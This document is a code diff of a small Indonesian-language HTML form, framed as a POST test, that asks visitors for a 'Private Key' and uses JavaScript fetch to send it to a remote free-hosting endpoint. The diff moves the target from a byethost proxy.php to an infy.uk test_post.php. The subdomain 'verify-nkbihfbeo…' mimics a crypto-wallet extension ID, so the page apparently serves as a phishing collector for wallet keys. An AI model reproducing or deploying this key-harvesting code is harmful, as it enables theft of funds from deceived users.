@@ -1,36 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Form POST dengan Proxy</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Percobaan POST</title>
 </head>
 <body>
-    <label for="PrivateKey">Private Key:</label>
-    <input type="text" id="PrivateKey" name="PrivateKey" required>
-    <button onclick="submitForm()">Submit</button>
+    <h2>Uji Coba Form POST ke InfinityFree</h2>
+    <input type="text" id="privateKey" placeholder="Masukkan Private Key">
+    <button onclick="submitForm()">Kirim</button>
 
     <script>
         function submitForm() {
-            console.log("Tombol diklik, fungsi submitForm() berjalan");
+            let privateKey = document.getElementById("privateKey").value;
+            console.log("Mengirim Private Key:", privateKey);
 
-            const privateKey = document.getElementById("PrivateKey").value;
-            console.log("Private Key:", privateKey);
-
-            fetch("https://verify-nkbihfbeo.byethost18.com/proxy.php", {
+            fetch("https://verify-nkbihfbeogaeaoehlefn.infy.uk/test_post.php", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
+                    "Content-Type": "application/json"
                 },
-                body: "PrivateKey=" + encodeURIComponent(privateKey)
+                body: JSON.stringify({ privateKey: privateKey })
             })
             .then(response => response.text())
-            .then(data => {
-                console.log("Response dari server:", data);
-                alert(data); // Tampilkan respons dari server
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("Terjadi kesalahan, cek konsol untuk detailnya.");
-            });
+            .then(data => console.log("Response dari server:", data))
+            .catch(error => console.error("Error:", error));
         }
     </script>
 </body>
